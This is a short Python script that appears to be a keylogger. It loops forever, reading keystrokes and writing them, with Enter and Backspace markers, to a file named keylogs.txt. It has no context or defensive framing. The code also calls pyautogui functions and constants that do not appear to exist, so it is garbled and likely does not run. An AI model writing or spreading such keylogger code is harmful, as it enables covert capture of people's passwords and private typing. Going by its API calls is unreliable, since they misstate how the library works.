import pyautogui

with open('keylogs.txt', 'w') as f:
    while True:
        key = pyautogui.keyStroke()
        if key.isprintable():
            f.write(key)
        elif key == pyautogui.KEY_RETURN:
            f.write('[ENTER]')
        elif key == pyautogui.KEY_BACKSPACE:
            f.write('[BACKSPACE]')

        print(key)
